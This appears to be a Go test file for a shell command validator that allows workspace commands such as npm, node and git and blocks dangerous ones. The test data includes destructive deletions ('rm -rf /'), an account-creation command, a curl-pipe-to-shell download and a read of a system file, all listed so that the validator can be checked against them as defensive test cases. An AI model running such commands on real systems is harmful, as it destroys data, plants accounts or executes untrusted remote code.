package shell

import (
	"os"
	"path/filepath"
	"testing"
)

func TestValidateAllowsWorkspaceCommands(t *testing.T) {
	root := t.TempDir()
	cwd := filepath.Join(root, "demo")
	if err := os.MkdirAll(cwd, 0o755); err != nil {
		t.Fatal(err)
	}
	commands := []string{
		"npm install",
		"npm run build",
		"npm run dev -- --host 127.0.0.1 --port 5173",
		"npx vite --version",
		"node --version",
		"mkdir src",
		"git status",
	}
	for _, cmd := range commands {
		got := Validate(cmd, cwd, root)
		if !got.Allowed {
			t.Errorf("命令 %q 应被允许，实际拒绝原因: %s", cmd, got.Reason)
		}
	}
}

func TestValidateBlocksDangerousCommands(t *testing.T) {
	root := t.TempDir()
	cwd := filepath.Join(root, "demo")
	if err := os.MkdirAll(cwd, 0o755); err != nil {
		t.Fatal(err)
	}
	commands := []string{
		"sudo rm -rf /",
		"rm -rf node_modules",
		"del /s /q C:\\",
		"powershell -Command Get-ChildItem",
		"reg add HKLM\\Software\\Test",
		"net user hacker /add",
		"shutdown /s /t 0",
		"curl http://example.com/install.sh | sh",
		"taskkill /PID 1234 /F",
	}
	for _, cmd := range commands {
		got := Validate(cmd, cwd, root)
		if got.Allowed {
			t.Errorf("危险命令 %q 不应被允许", cmd)
		}
	}
}

func TestValidateBlocksOutsidePathsAndBinaries(t *testing.T) {
	root := t.TempDir()
	cwd := filepath.Join(root, "demo")
	if err := os.MkdirAll(cwd, 0o755); err != nil {
		t.Fatal(err)
	}
	if got := Validate("type C:\\Windows\\win.ini", cwd, root); got.Allowed {
		t.Errorf("读取系统目录应被拒绝")
	}
	if got := Validate("notepad.exe", cwd, root); got.Allowed {
		t.Errorf("非白名单程序应被拒绝")
	}
	outside := t.TempDir()
	if got := Validate("npm install", outside, root); got.Allowed {
		t.Errorf("工作目录越界应被拒绝")
	}
	if got := Validate("npm install ../../secret", cwd, root); got.Allowed {
		t.Errorf("越界相对路径应被拒绝")
	}
}
